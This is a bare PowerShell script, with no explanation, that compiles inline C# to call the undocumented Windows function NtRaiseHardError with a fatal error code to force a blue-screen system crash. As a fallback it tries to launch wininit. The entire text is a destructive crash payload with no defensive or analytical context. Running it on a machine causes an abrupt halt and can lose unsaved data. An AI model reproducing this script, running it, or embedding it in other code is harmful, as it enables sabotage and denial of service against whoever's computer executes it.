$code = @'
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ResponseOption, ref int Response);
    public static void Crash() {
        int resp = 0;
        NtRaiseHardError(0xC0000001, 0, 0, IntPtr.Zero, 0x20, ref resp);
    }
}
'@
try {
    Add-Type -TypeDefinition $code
    [BSOD]::Crash()
} catch {
    try { Start-Process wininit } catch {}
}